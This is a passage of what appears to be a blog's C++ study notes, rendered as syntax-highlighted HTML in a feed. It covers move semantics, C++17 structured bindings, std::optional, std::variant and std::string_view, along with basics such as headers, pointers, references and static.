release dynamically allocated memory</span></span><br><span class="line">    ~<span class="built_in">String</span>() &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] m_Data;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Destroyed!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Method to print the contents of the String object</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; m_Size; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, m_Data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span>* m_Data; <span class="comment">// Pointer to the string data</span></span><br><span class="line">    <span class="type">uint32_t</span> m_Size; <span class="comment">// Size of the string</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    String m_Name; <span class="comment">// A member variable of type String</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Constructor accepting a lvalue reference, used to initialize Entity object</span></span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">const</span> String&amp; name) : <span class="built_in">m_Name</span>(name) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Constructor accepting a rvalue reference, used to initialize Entity object</span></span><br><span class="line">    <span class="built_in">Entity</span>(String&amp;&amp; name) : <span class="built_in">m_Name</span>(std::<span class="built_in">move</span>(name)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Method to print the name of the Entity</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        m_Name.<span class="built_in">Print</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Creating an Entity object with a string literal (lvalue)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="function">Entity <span class="title">e</span><span class="params">(<span class="string">&quot;Randolfluo&quot;</span>)</span></span>;</span><br><span class="line">    e.<span class="built_in">PrintName</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="comment">// Creating a String object with a string literal</span></span><br><span class="line">    String arr = <span class="string">&quot;Ran&quot;</span>;</span><br><span class="line">    <span class="comment">// Creating an Entity object with a named String object (lvalue)</span></span><br><span class="line">    <span class="function">Entity <span class="title">e1</span><span class="params">(arr)</span></span>;</span><br><span class="line">    e<span class="number">1.</span><span class="built_in">PrintName</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="comment">// Creating two String objects</span></span><br><span class="line">    String arr1 = <span class="string">&quot;Apple&quot;</span>;</span><br><span class="line">    String arr2;</span><br><span class="line">    arr<span class="number">1.</span><span class="built_in">Print</span>();</span><br><span class="line">    arr<span class="number">2.</span><span class="built_in">Print</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="comment">// Moving the content of one String object to another</span></span><br><span class="line">    arr2 = std::<span class="built_in">move</span>(arr1);</span><br><span class="line">    arr<span class="number">1.</span><span class="built_in">Print</span>();</span><br><span class="line">    arr<span class="number">2.</span><span class="built_in">Print</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    std::cin.<span class="built_in">get</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--------------------------------------</span></span><br><span class="line"><span class="comment">Created!</span></span><br><span class="line"><span class="comment">Moved!</span></span><br><span class="line"><span class="comment">Destroyed!</span></span><br><span class="line"><span class="comment">Randolfluo</span></span><br><span class="line"><span class="comment">--------------------------------------</span></span><br><span class="line"><span class="comment">Created!</span></span><br><span class="line"><span class="comment">Copied!</span></span><br><span class="line"><span class="comment">Ran</span></span><br><span class="line"><span class="comment">--------------------------------------</span></span><br><span class="line"><span class="comment">Created!</span></span><br><span class="line"><span class="comment">Apple</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------------------</span></span><br><span class="line"><span class="comment">Moved!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Apple</span></span><br><span class="line"><span class="comment">--------------------------------------*/</span></span><br></pre></td></tr></table></figure><p>//TODO</p><p>std::move</p><p>move assignment operator</p><h3 id="perfect-forward"><a href="#perfect-forward" class="headerlink" title="perfect forward"></a>perfect forward</h3><h3 id="Structured-binding-C-17"><a href="#Structured-binding-C-17" class="headerlink" title="Structured binding  C++17"></a>Structured binding  C++17</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tuple&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::tuple&lt;std::string, <span class="type">int</span>&gt; <span class="title">CreatePersion</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> &#123; <span class="string">&quot;Randolfluo&quot;</span>, <span class="number">19</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> person = <span class="built_in">CreatePersion</span>();</span><br><span class="line">std::string&amp; name = std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(person);</span><br><span class="line"><span class="type">int</span> age = std::<span class="built_in">get</span>&lt;<span class="number">1</span>&gt;(person);</span><br><span class="line"></span><br><span class="line">std::string name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">std::<span class="built_in">tie</span>(name, age) = <span class="built_in">CreatePersion</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> [name, age] = <span class="built_in">CreatePersion</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-optional-C-17"><a href="#std-optional-C-17" class="headerlink" title="std::optional C++17"></a>std::optional C++17</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;optional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::optional&lt;std::string&gt; <span class="title">ReadFileAsString</span><span class="params">(<span class="type">const</span> std::string&amp; filepath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">std::ifstream <span class="title">stream</span><span class="params">(filepath)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (stream)</span><br><span class="line">&#123;</span><br><span class="line">std::string result;</span><br><span class="line"><span class="comment">//read file</span></span><br><span class="line">stream.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::optional&lt;std::string&gt; data = <span class="built_in">ReadFileAsString</span>(<span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line">std::string value = data.<span class="built_in">value_or</span>(<span class="string">&quot;Not present&quot;</span>);</span><br><span class="line">std::cout &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (data)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;File read sucessfully!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;File could not be opened!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-variant"><a href="#std-variant" class="headerlink" title="std::variant"></a>std::variant</h3><ul><li>variant is more type-safe than union, but less efficient</li><li>variant is more type-safe than any</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;variant&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ErrorNum</span></span><br><span class="line">&#123;</span><br><span class="line">None = <span class="number">0</span>, NotFound = <span class="number">1</span>, NoAccess = <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">std::variant&lt;std::string,ErrorNum&gt; <span class="title">ReadFileAsString</span><span class="params">(<span class="type">const</span> std::string&amp; filepath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">std::ifstream <span class="title">stream</span><span class="params">(filepath)</span></span>;</span><br><span class="line"></span><br><span class="line">std::variant&lt;std::string, ErrorNum&gt; result ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stream.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">std::string line;</span><br><span class="line">std::string content;</span><br><span class="line"><span class="keyword">while</span> (std::<span class="built_in">getline</span>(stream, line))</span><br><span class="line">&#123;</span><br><span class="line">content += line +<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">result = content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ErrorNum::None;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::variant&lt;std::string, ErrorNum&gt; data;</span><br><span class="line">data = <span class="built_in">ReadFileAsString</span>(<span class="string">&quot;data.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (std::<span class="built_in">get_if</span>&lt;std::string&gt;(&amp;data))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;File read sucessfully!\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; std::<span class="built_in">get</span>&lt;std::string&gt;(data) &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;File could not be opened!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-any-C-17"><a href="#std-any-C-17" class="headerlink" title="std::any C++17"></a>std::any C++17</h3><ul><li>Small type, similar to struct.</li><li>Large types, dynamically allocated.</li></ul><h3 id="std-asnyc"><a href="#std-asnyc" class="headerlink" title="std::asnyc"></a>std::asnyc</h3><p>//TODO</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h3><ul><li>std::string_view    C++17</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> s_AllocCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">s_AllocCount++;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Allocating &quot;</span> &lt;&lt; size &lt;&lt; <span class="string">&quot;byte!\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">malloc</span>(size); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">(<span class="type">const</span> std::string&amp; name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName1</span><span class="params">(std::string_view name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::string name = <span class="string">&quot;Randolf luo123412341234&quot;</span>;<span class="comment">//More than 16 bytes are used to call mallocC++20x64 msvcrelease</span></span><br><span class="line">std::string firstName = name.<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">16</span>);<span class="comment">//calling malloc</span></span><br><span class="line"><span class="built_in">PrintName</span>(firstName);</span><br><span class="line">std::string lastName = name.<span class="built_in">substr</span>(<span class="number">8</span>, <span class="number">10</span>);<span class="comment">//malloc was not called</span></span><br><span class="line"><span class="built_in">PrintName</span>(lastName);</span><br><span class="line">std::cout &lt;&lt; s_AllocCount &lt;&lt; <span class="string">&quot; allocations\n&quot;</span>;</span><br><span class="line">s_AllocCount = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::string name1 = <span class="string">&quot;Randolf luo123412341234&quot;</span>;</span><br><span class="line"><span class="function">std::string_view <span class="title">firstName1</span><span class="params">(name<span class="number">1.</span>c_str(), <span class="number">17</span>)</span></span>;</span><br><span class="line"><span class="built_in">PrintName1</span>(firstName1);</span><br><span class="line"><span class="function">std::string_view <span class="title">lastName1</span><span class="params">(name<span class="number">1.</span>c_str() + <span class="number">8</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line"><span class="built_in">PrintName1</span>(lastName1);</span><br><span class="line">std::cout &lt;&lt; s_AllocCount &lt;&lt; <span class="string">&quot; allocations\n&quot;</span>;</span><br><span class="line">s_AllocCount = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* name2 = <span class="string">&quot;Randolf luo123412341234&quot;</span>;</span><br><span class="line"><span class="function">std::string_view <span class="title">firstName2</span><span class="params">(name2, <span class="number">17</span>)</span></span>;</span><br><span class="line"><span class="built_in">PrintName1</span>(firstName2);</span><br><span class="line"><span class="function">std::string_view <span class="title">lastName2</span><span class="params">(name2 + <span class="number">8</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line"><span class="built_in">PrintName1</span>(lastName2);</span><br><span class="line">std::cout &lt;&lt; s_AllocCount &lt;&lt; <span class="string">&quot; allocations\n&quot;</span>;</span><br><span class="line">s_AllocCount = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;------------------------------------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>string</p>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> cherno </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> cherno </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cpp</title>
      <link href="/2024/03/18/C&amp;C++/Cpp/"/>
      <url>/2024/03/18/C&amp;C++/Cpp/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h3 id="Solution-and-Project"><a href="#Solution-and-Project" class="headerlink" title="Solution and Project"></a>Solution and Project</h3><ul><li><p>Solution is a vessel containing projects, and the code is the actual organizational unit of the project.</p></li><li><p>Solution is used to organize and manage multiple projects, while a project is used for real operations and construction.</p></li></ul><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span><span class="comment">//Pre-process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1<span class="comment">//Pre-process can be an annotation</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// The &quot;static&quot; keyword means that the function is only declared within this translation unit.</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">log</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello World&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//Entry ponit</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello World&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cin.<span class="built_in">get</span>();<span class="comment">//It seems like the C function `getchar()`.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li><code>cin、cout</code>,Corresponding to the standard input stream and the standard output stream</li><li><code>std::cout &lt;&lt; &quot;hello World&quot; &lt;&lt; std::endl;</code>can be considered as<code>std::cout.print(&quot;hello world&quot;).print(&quot;\n&quot;);</code></li></ul><h3 id="variable"><a href="#variable" class="headerlink" title="variable"></a>variable</h3><ul><li>The <code>sizeof()</code> function returns the size of variables.</li><li>If we define a float, we must add ‘f’ behind the variable, such as 0.3f. Otherwise, it will be recognized as a double variable.</li></ul><h3 id="head-file"><a href="#head-file" class="headerlink" title="head file"></a>head file</h3><h4 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h4><p>The difference between <code>&quot;&quot;</code> and <code>&lt;&lt;&gt;&gt;</code>:</p><p>Angle brackets are only used by the compiler to include paths. Quotes can do anything, but they are usually used for relative paths.</p><p>We have two ways to ensure that a header file is included only once:</p><h4 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h4><p><code>#pragma once</code> means only include this header file once.</p><h4 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FunctionA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FunctionA</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FunctionA</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="and-amp"><a href="#and-amp" class="headerlink" title="* and &amp;"></a>* and &amp;</h3><ul><li><p>A pointer is an object in its own right. </p></li><li><p>A pointer need not be initialized at the time it is defined. </p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* ptr = <span class="literal">nullptr</span>;<span class="comment">//pointer in C++11</span></span><br></pre></td></tr></table></figure><ul><li><code>A Reference Is an Alias.</code>A reference is not an object. Instead, a reference is just another name for an already existing object.</li><li>A reference must be initialized.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">(<span class="type">int</span>&amp; value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">value ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">Function</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Passing arguments by reference.</span></span><br></pre></td></tr></table></figure><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><ul><li>Use the prefix <code>s_</code>   to denote a static variable</li><li>static functions and global variables are accessible only from within the translation unit.</li><li>A static local variable persists after the function exits.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">i++;</span><br><span class="line">std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">Function</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">Function</span>();</span><br><span class="line"><span class="built_in">Function</span>();</span><br><span class="line"><span class="built_in">Function</span>();</span><br><span class="line"><span class="built_in">Function</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>A static class variable or method can have only one instance.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span 